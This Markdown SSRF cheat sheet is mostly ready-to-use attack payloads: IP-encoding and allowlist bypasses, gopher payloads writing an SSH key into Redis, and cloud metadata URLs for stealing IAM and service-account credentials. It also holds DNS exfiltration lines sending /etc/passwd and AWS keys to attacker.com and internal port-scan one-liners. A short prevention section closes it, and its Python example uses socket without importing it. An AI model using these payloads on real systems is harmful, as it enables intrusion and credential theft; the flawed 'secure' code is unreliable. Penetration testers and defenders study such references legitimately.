# SSRF Cheat Sheet

Complete reference for Server-Side Request Forgery exploitation, bypass techniques, and prevention.

## Table of Contents

1. [Quick Payloads](#quick-payloads)
2. [Bypass Techniques](#bypass-techniques)
3. [Protocol Exploitation](#protocol-exploitation)
4. [Cloud Metadata Endpoints](#cloud-metadata-endpoints)
5. [Detection Methods](#detection-methods)
6. [Tools and Commands](#tools-and-commands)
7. [Prevention Checklist](#prevention-checklist)

---

## Quick Payloads

### Localhost Access

```bash
# Standard representations
http://127.0.0.1/
http://localhost/
http://0.0.0.0/

# Shorthand notation
http://127.1/
http://127.0.1/
http://0/

# Decimal notation (127.0.0.1 → decimal)
http://2130706433/

# Hexadecimal notation
http://0x7f000001/
http://0x7f.0x00.0x00.0x01/

# Octal notation
http://017700000001/
http://0177.0.0.1/

# IPv6 localhost
http://[::1]/
http://[0:0:0:0:0:0:0:1]/
http://[::ffff:127.0.0.1]/

# Mixed encoding
http://0x7f.0.0.1/
http://127.000.000.001/

# Domain-based
http://localhost.localdomain/
http://127.0.0.1.nip.io/
```

### Private IP Ranges

```bash
# Class A (10.0.0.0/8)
http://10.0.0.1/
http://167772161/                    # Decimal

# Class B (172.16.0.0/12)
http://172.16.0.1/
http://2886729729/                   # Decimal

# Class C (192.168.0.0/16)
http://192.168.0.1/
http://3232235521/                   # Decimal
http://192.168.1/                    # Shorthand

# Link-local (169.254.0.0/16)
http://169.254.169.254/              # AWS/Azure metadata
http://169.254.1.1/                  # Shorthand
```

### URL Encoding

```bash
# Single encoding
http://127.0.0.1/%61dmin             # a = %61
http://127.0.0.1/ad%6din             # m = %6d
http://127.0.0.1/admin%3Fkey%3Dvalue # ? = %3F, = = %3D

# Double encoding
http://127.0.0.1/%2561dmin           # a = %61 = %2561
http://127.0.0.1/%252561dmin         # Triple encoding

# Mixed encoding
http://127.0.0.1/ad%256din

# Unicode encoding
http://127.0.0.1/\u0061dmin

# UTF-8 overlong encoding
http://127.0.0.1/%C0%AE%C0%AE/admin

# HTML entities (context-dependent)
http://127.0.0.1/&#97;dmin
```

### Bypass Filters

```bash
# Case variation
http://LocalHost/
http://LOCALHOST/
http://LoCaLhOsT/

# Null byte injection
http://127.0.0.1%00/
http://trusted.com%00.attacker.com/
http://127.0.0.1%00.example.com/

# Whitespace injection
http://127.0.0.1 /admin
http://127.0.0.1%09/admin            # Tab
http://127.0.0.1%0a/admin            # Newline

# Special characters
http://127.0.0.1;/admin
http://127.0.0.1:/admin
http://127.0.0.1,/admin
```

---

## Bypass Techniques

### Blacklist Bypasses

#### Alternative IP Representations

```bash
# When 127.0.0.1 is blocked
http://127.1/
http://127.0.1/
http://2130706433/
http://0x7f000001/
http://017700000001/
http://0/
http://[::1]/

# When 192.168.x.x is blocked
http://192.168.1/                    # Shorthand
http://3232235777/                   # Decimal (192.168.1.1)
http://0xC0.0xA8.0x01.0x01/          # Hex
```

#### Path Encoding

```bash
# When /admin is blocked
/%61dmin                             # Single encode
/%2561dmin                           # Double encode
/%252561dmin                         # Triple encode
/admin                               # Case variation
/ADMIN
/AdMiN

# Directory traversal
/api/../admin
/public/../admin
/static/../../admin

# Null bytes
/admin%00
/admin%00.jpg
```

#### Domain Tricks

```bash
# When localhost is blocked
http://127.0.0.1/
http://127.1/
http://[::1]/
http://0/
http://2130706433/
http://0x7f000001/
http://localhost.localdomain/
http://127.0.0.1.nip.io/
```

### Whitelist Bypasses

#### Subdomain Confusion

```bash
# Attacker-controlled subdomain
http://trusted.com.attacker.com/

# Subdomain takeover
http://abandoned-subdomain.trusted.com/
```

#### Open Redirect Chaining

```bash
# Via trusted domain
http://trusted.com/redirect?url=http://localhost/admin
http://trusted.com/goto?next=http://169.254.169.254/
```

#### URL Parser Confusion

```bash
# @ symbol exploitation
http://trusted.com@attacker.com/
http://attacker.com@trusted.com/
http://localhost@trusted.com/

# Fragment/anchor abuse
http://localhost#@trusted.com
http://localhost:80#@trusted.com/admin

# Double-encoded fragment
http://localhost:80%2523@trusted.com/admin

# Username/password in URL
http://user:pass@trusted.com:80@localhost/
```

#### Path Traversal

```bash
# Directory traversal
http://trusted.com/../../../localhost/admin
http://trusted.com/../../etc/passwd

# Encoded traversal
http://trusted.com/%2e%2e%2f%2e%2e%2f/etc/passwd
http://trusted.com/..%2f..%2f..%2f/etc/passwd
```

#### CRLF Injection

```bash
# Inject headers
http://trusted.com/%0d%0aHost:%20localhost

# Full request smuggling
http://trusted.com/%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a
```

### Protocol Confusion

```bash
# Different schemes
https://trusted.com vs http://trusted.com
HTTP://trusted.com vs http://trusted.com

# Backslash (Windows-style)
http://trusted.com\@localhost/
http:\\localhost/admin

# Forward slash alternatives
http:/\/\/localhost/admin
http://////localhost/admin
```

### DNS Rebinding

```bash
# Time-of-check vs time-of-use
1. Request: http://attacker.com (resolves to 1.2.3.4 - passes check)
2. TTL expires, DNS updates
3. Server connects: http://attacker.com (now resolves to 127.0.0.1)

# Public services
http://rebinder.net
http://rbndr.us
http://dnsrebind.it

# Custom setup
attacker.com → 1.2.3.4 (TTL: 1 second)
attacker.com → 127.0.0.1 (after TTL expires)
```

---

## Protocol Exploitation

### Gopher Protocol

**Purpose**: Send arbitrary bytes to TCP services

#### Redis Exploitation

```bash
# Basic command
gopher://127.0.0.1:6379/_KEYS%20*

# Write SSH key
gopher://127.0.0.1:6379/_%2A1%0d%0a%248%0d%0aflushall%0d%0a%2A3%0d%0a%243%0d%0aset%0d%0a%241%0d%0a1%0d%0a%2464%0d%0a%0d%0a%0a%0assh-rsa%20AAAA...%0a%0a%0d%0a

# Command format (URL-encoded)
*1\r\n$8\r\nflushall\r\n
*3\r\n$3\r\nset\r\n$1\r\n1\r\n$64\r\n[SSH_KEY]\r\n
```

#### MySQL Exploitation

```bash
# Basic query
gopher://127.0.0.1:3306/_[MySQL_Payload]

# Authenticated request (complex encoding required)
# Use Gopherus tool for generation
```

#### FastCGI Exploitation

```bash
# RCE via FastCGI
gopher://127.0.0.1:9000/_[FastCGI_Payload]

# Use Gopherus tool to generate payloads
```

#### HTTP Request Smuggling

```bash
# Send arbitrary HTTP request
gopher://127.0.0.1:80/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a

# POST request
gopher://127.0.0.1:80/_POST%20/endpoint%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aContent-Length:%2010%0d%0a%0d%0atest=value
```

### File Protocol

```bash
# Read local files
file:///etc/passwd
file:///etc/hosts
file:///etc/hostname
file:///var/www/html/config.php
file:///proc/self/environ
file:///proc/self/cmdline

# Windows paths
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/inetpub/wwwroot/web.config
```

### Dict Protocol

```bash
# Memcached
dict://127.0.0.1:11211/stats
dict://127.0.0.1:11211/get:key

# Generic TCP service probing
dict://127.0.0.1:6379/INFO
```

### LDAP Protocol

```bash
# Directory information
ldap://127.0.0.1:389/dc=example,dc=com

# Search queries
ldap://127.0.0.1/cn=users,dc=example,dc=com
```

### SFTP/FTP Protocol

```bash
# FTP
ftp://127.0.0.1/file.txt
ftp://user:pass@internal-ftp/

# SFTP
sftp://127.0.0.1/path/to/file
```

### SMB Protocol

```bash
# Windows shares
\\127.0.0.1\C$\
\\localhost\ADMIN$\
smb://127.0.0.1/share
```

### Jar Protocol (Java)

```bash
# JAR file inclusion
jar:http://attacker.com/exploit.jar!/
jar:file:///var/www/html/upload.jar!/com/example/Exploit.class
```

---

## Cloud Metadata Endpoints

### AWS EC2 Metadata

#### IMDSv1 (Vulnerable to SSRF)

```bash
# Base endpoint
http://169.254.169.254/latest/meta-data/

# Instance information
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4

# IAM role credentials (CRITICAL)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]/

# User data (may contain secrets)
http://169.254.169.254/latest/user-data

# Instance identity document
http://169.254.169.254/latest/dynamic/instance-identity/document

# Public keys
http://169.254.169.254/latest/meta-data/public-keys/
```

#### IMDSv2 (SSRF-Resistant)

```bash
# Requires session token via PUT request
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

**SSRF Note**: Most SSRF vulnerabilities can't perform PUT requests or set custom headers, making IMDSv2 resistant.

### Azure Instance Metadata

```bash
# Base endpoint (requires header)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header: Metadata: true

# Instance information
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
http://169.254.169.254/metadata/instance/network?api-version=2021-02-01

# Managed identity token (CRITICAL)
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Scheduled events
http://169.254.169.254/metadata/scheduledevents?api-version=2019-08-01
```

**SSRF Note**: Requires `Metadata: true` header, but some SSRF contexts allow header injection.

### Google Cloud Metadata

```bash
# Base endpoint (requires header)
http://metadata.google.internal/computeMetadata/v1/
Header: Metadata-Flavor: Google

# Alternative IP
http://169.254.169.254/computeMetadata/v1/
Header: Metadata-Flavor: Google

# Project information
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id

# Instance information
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id

# Service account token (CRITICAL)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# All attributes (recursive)
http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true
http://metadata.google.internal/computeMetadata/v1/project/?recursive=true

# Kube-env (GKE sensitive data)
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
```

**SSRF Note**: Requires `Metadata-Flavor: Google` header.

### DigitalOcean Metadata

```bash
# Instance metadata
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region

# User data
http://169.254.169.254/metadata/v1/user-data

# Interfaces
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address
```

### Oracle Cloud Infrastructure (OCI)

```bash
# Instance metadata
http://169.254.169.254/opc/v2/instance/
http://169.254.169.254/opc/v1/instance/

# VNIC information
http://169.254.169.254/opc/v2/vnics/
```

### Alibaba Cloud

```bash
# Instance metadata
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id

# RAM role credentials
http://100.100.100.200/latest/meta-data/ram/security-credentials/[ROLE_NAME]
```

### Kubernetes

```bash
# Service account token
/var/run/secrets/kubernetes.io/serviceaccount/token

# Via SSRF (if file:// allowed)
file:///var/run/secrets/kubernetes.io/serviceaccount/token

# API server
https://kubernetes.default.svc/api/v1/namespaces/default/pods
```

---

## Detection Methods

### Direct Detection

```bash
# Response analysis
1. Send: http://localhost/admin
2. Compare response to: http://example.com/admin
3. Different response = SSRF confirmed

# Error messages
"Connection refused" = Port closed
"Connection timeout" = Firewall/filtered
"200 OK" = Service accessible
"Internal Server Error" = Potential SSRF
```

### Time-Based Detection

```bash
# Port scan timing
Open port: Fast response
Closed port: Immediate "Connection refused"
Filtered port: Timeout (5-30 seconds)

# Use timing to map internal network
http://192.168.0.1:22/    → Fast (SSH open)
http://192.168.0.1:9999/  → Slow (timeout)
```

### Out-of-Band (Blind SSRF)

#### DNS Callback

```bash
# Burp Collaborator
http://abc123xyz.burpcollaborator.net

# Alternative services
http://xyz.canarytokens.com
http://requestbin.com/xyz
http://webhook.site/xyz

# DNS exfiltration
http://$(whoami).abc123.burpcollaborator.net
http://data-here.abc123.burpcollaborator.net
```

#### HTTP Callback

```bash
# Basic callback
http://abc123.burpcollaborator.net/ssrf-test

# With path
http://abc123.burpcollaborator.net/$(whoami)

# Webhook services
http://webhook.site/abc-def-123
http://requestbin.com/r/abc123
```

#### DNS Exfiltration

```bash
# Whoami
http://$(whoami).attacker.com

# File content (base64)
http://$(cat /etc/passwd | base64 | cut -c1-50).attacker.com

# Current directory
http://$(pwd | tr '/' '-').attacker.com

# Environment variable
http://$AWS_ACCESS_KEY_ID.attacker.com
```

### Content-Based Detection

```bash
# Keywords in response
"root:x:0:0:" = /etc/passwd read
"ami-id" = AWS metadata
"ComputerName" = Windows metadata
"admin panel" = Internal admin access
"Internal Server" = Internal service

# Response length
Length change = Different endpoint accessed
Consistent length = Same default page/error
```

---

## Tools and Commands

### Manual Testing

#### cURL

```bash
# Basic SSRF test
curl -X POST http://target.com/fetch -d "url=http://127.0.0.1/"

# With custom headers
curl http://target.com/fetch \
  -H "Referer: http://abc123.burpcollaborator.net" \
  -d "url=http://localhost/admin"

# Follow redirects
curl -L http://target.com/fetch?url=http://evil.com/redirect

# Verbose output
curl -v http://target.com/fetch?url=http://127.0.0.1/

# Timeout
curl --max-time 10 http://target.com/fetch?url=http://192.168.0.1:22/
```

#### Python

```python
import requests

# Basic test
r = requests.post('http://target.com/fetch',
                  data={'url': 'http://127.0.0.1/admin'})
print(r.text)

# With headers
headers = {'Referer': 'http://abc123.burpcollaborator.net'}
r = requests.get('http://target.com/product', headers=headers)

# Timeout for port scanning
try:
    r = requests.post('http://target.com/fetch',
                      data={'url': 'http://192.168.0.1:22'},
                      timeout=5)
except requests.Timeout:
    print("Port filtered or service slow")
```

### Automated Tools

#### SSRFmap

```bash
# Install
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap
pip3 install -r requirements.txt

# Basic scan
python3 ssrfmap.py -r request.txt -p url -m readfiles

# AWS metadata
python3 ssrfmap.py -r request.txt -p url -m aws

# Port scan
python3 ssrfmap.py -r request.txt -p url -m portscan

# Custom payloads
python3 ssrfmap.py -r request.txt -p url --payload http://127.0.0.1/admin
```

#### Gopherus

```bash
# Install
git clone https://github.com/tarunkant/Gopherus
cd Gopherus
chmod +x install.sh
./install.sh

# Generate Redis payload
python2 gopherus.py --exploit redis

# Generate MySQL payload
python2 gopherus.py --exploit mysql

# Generate FastCGI payload
python2 gopherus.py --exploit fastcgi

# Generate SMTP payload
python2 gopherus.py --exploit smtp
```

#### SSRFire

```bash
# Install
go install github.com/zt2/ssrfire@latest

# Basic scan
ssrfire -u http://target.com/fetch?url=FUZZ

# Custom wordlist
ssrfire -u http://target.com/fetch?url=FUZZ -w payloads.txt

# Rate limiting
ssrfire -u http://target.com/fetch?url=FUZZ -t 10 -d 100ms
```

#### ffuf

```bash
# Fuzz URL parameter
ffuf -u http://target.com/fetch?url=FUZZ \
     -w ssrf-payloads.txt \
     -mc 200,500

# IP range fuzzing
ffuf -u http://target.com/fetch?url=http://192.168.0.FUZZ/ \
     -w <(seq 1 255) \
     -mc 200

# Port scanning
ffuf -u http://target.com/fetch?url=http://192.168.0.1:FUZZ/ \
     -w <(seq 1 65535) \
     -mc 200
```

### Burp Suite Extensions

```
1. Collaborator Everywhere
   - Auto-injects Collaborator payloads
   - Passive blind SSRF detection

2. Param Miner
   - Discovers hidden parameters
   - Tests for SSRF in discovered params

3. AWS Security Checks
   - Automated cloud metadata testing
   - IMDSv1/v2 detection

4. Backslash Powered Scanner
   - Advanced insertion points
   - Protocol smuggling detection

5. SSRF Detector
   - Specialized SSRF scanning
   - Multiple bypass techniques
```

### One-Liners

```bash
# Quick localhost test
curl -X POST http://target.com/api -d '{"url":"http://127.0.0.1/admin"}' -H "Content-Type: application/json"

# AWS metadata quick check
for i in $(seq 1 255); do curl -s "http://target.com/fetch?url=http://169.254.169.$i/"; done | grep -i "ami\|instance"

# Port scan via SSRF
for port in 22 80 443 3306 6379 8080; do echo -n "Port $port: "; curl -s --max-time 2 "http://target.com/fetch?url=http://192.168.0.1:$port/" && echo "Open"; done

# Internal IP scan
for i in $(seq 1 255); do curl -s "http://target.com/fetch?url=http://192.168.0.$i/" | grep -q "admin" && echo "192.168.0.$i - Admin found"; done
```

---

## Prevention Checklist

### Input Validation

```python
✓ Allowlist permitted URLs/domains
✓ Validate URL scheme (only http/https)
✓ Validate hostname format
✓ Block private IP ranges
✓ Block localhost representations
✓ Block cloud metadata endpoints
✓ Validate after DNS resolution
✓ Check for redirects to internal IPs
```

### Network Security

```
✓ Network segmentation
✓ Firewall rules for outbound connections
✓ Disable unused protocols (gopher, file, dict, etc.)
✓ Use IMDSv2 for AWS (requires session token)
✓ Restrict internal services to localhost only
✓ Authentication on internal services
✓ Monitor outbound connections
```

### Application Security

```python
✓ Don't return raw responses to users
✓ Sanitize error messages
✓ Implement rate limiting
✓ Log all URL fetch requests
✓ Use dedicated service accounts with minimal permissions
✓ Disable DNS rebinding (validate before AND during connection)
✓ Set connection timeouts
✓ Use allow-redirects=False
```

### Code Examples

#### Python - Secure Implementation

```python
import requests
import ipaddress
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['api.trusted.com', 'cdn.example.com']
BLOCKED_IPS = [
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),
]

def is_safe_url(url):
    parsed = urlparse(url)

    # Only allow HTTP/HTTPS
    if parsed.scheme not in ['http', 'https']:
        return False

    # Check domain allowlist
    if parsed.hostname not in ALLOWED_DOMAINS:
        return False

    # Resolve DNS and check IP
    try:
        ip = socket.gethostbyname(parsed.hostname)
        ip_obj = ipaddress.ip_address(ip)

        # Block private IPs
        for network in BLOCKED_IPS:
            if ip_obj in network:
                return False
    except:
        return False

    return True

def safe_fetch(url):
    if not is_safe_url(url):
        raise ValueError("URL not allowed")

    response = requests.get(url,
                           timeout=5,
                           allow_redirects=False)

    # Don't return raw response
    return {
        'status': response.status_code,
        'length': len(response.content)
    }
```

#### Node.js - Secure Implementation

```javascript
const axios = require('axios');
const ipaddr = require('ipaddr.js');
const dns = require('dns').promises;

const ALLOWED_DOMAINS = ['api.trusted.com', 'cdn.example.com'];

async function isSafeUrl(url) {
  const parsed = new URL(url);

  // Only HTTP/HTTPS
  if (!['http:', 'https:'].includes(parsed.protocol)) {
    return false;
  }

  // Check allowlist
  if (!ALLOWED_DOMAINS.includes(parsed.hostname)) {
    return false;
  }

  // Resolve and check IP
  const addresses = await dns.resolve4(parsed.hostname);
  for (const addr of addresses) {
    const ip = ipaddr.parse(addr);
    if (ip.range() !== 'unicast') {
      return false;
    }
  }

  return true;
}

async function safeFetch(url) {
  if (!await isSafeUrl(url)) {
    throw new Error('URL not allowed');
  }

  const response = await axios.get(url, {
    timeout: 5000,
    maxRedirects: 0
  });

  // Don't return raw response
  return {
    status: response.status,
    length: response.data.length
  };
}
```

### AWS IMDSv2 Configuration

```bash
# Enable IMDSv2 on EC2 instance
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890abcdef0 \
  --http-tokens required \
  --http-put-response-hop-limit 1

# Launch template with IMDSv2
aws ec2 create-launch-template \
  --launch-template-name secure-template \
  --launch-template-data '{
    "MetadataOptions": {
      "HttpTokens": "required",
      "HttpPutResponseHopLimit": 1
    }
  }'
```

---

## Quick Reference

### Most Common Payloads

```bash
# Localhost
http://127.0.0.1/
http://127.1/
http://localhost/
http://[::1]/

# AWS Metadata
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Encoding bypass
http://127.0.0.1/%2561dmin

# Whitelist bypass
http://localhost:80%2523@trusted.com/admin

# Blind detection
Referer: http://abc123.burpcollaborator.net
```

### Port Scanning

```bash
# Common internal ports
22   - SSH
80   - HTTP
443  - HTTPS
3306 - MySQL
5432 - PostgreSQL
6379 - Redis
8080 - HTTP Alt
9200 - Elasticsearch
```

### Response Indicators

```
200 OK             → Service accessible
403 Forbidden      → Service exists, auth required
404 Not Found      → Endpoint not found
500 Internal Error → Potential vulnerability
Connection timeout → Port filtered
Connection refused → Port closed
```

---

*Use responsibly and only on authorized targets. SSRF can lead to critical security breaches.*
